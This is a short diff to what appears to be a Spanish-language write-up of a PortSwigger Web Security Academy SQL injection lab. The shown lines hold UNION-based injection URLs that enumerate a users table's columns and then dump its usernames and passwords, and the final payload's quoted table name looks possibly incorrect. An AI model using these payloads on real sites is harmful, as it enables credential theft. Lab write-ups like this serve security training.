@@ -41,4 +41,7 @@ To solve the lab, log in as the `administrator` user.
 .web-security-academy.net/filter?category=-Pets' Union Select '1',column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users_tcaine' -- -
     # password_wyuxxb
     # username_fzanak
+
+## Dumpear los Datos
+.web-security-academy.net/filter?category=-Pets' Union Select '1',concat(password_wyuxxb,' ::: ',username_fzanak) FROM 'users_tcaine' -- -
 ````
